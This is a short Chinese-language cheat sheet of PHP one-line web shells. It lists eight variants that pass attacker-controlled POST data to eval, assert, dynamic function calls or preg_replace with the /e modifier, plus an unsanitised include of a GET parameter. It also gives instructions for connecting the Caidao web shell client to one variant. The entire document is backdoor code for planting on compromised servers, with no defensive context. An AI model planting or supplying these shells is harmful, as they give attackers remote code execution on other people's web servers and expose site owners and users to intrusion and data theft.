[+]php一句话

1) <?php eval($_POST[sb]);?>
2) <?php @eval($_POST[sb]);?>
3) <?php assert($_POST[sb]);?>
4) <?$_POST['sa']($_POST['sb']);?>
5) <?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
6) <?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?>
　 //使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
　 <O>h=@eval($_POST[c]);</O>
7) <script language="php">@eval($_POST[sb])</script>
8) $filename=$_GET['xbid'];
   include ($filename);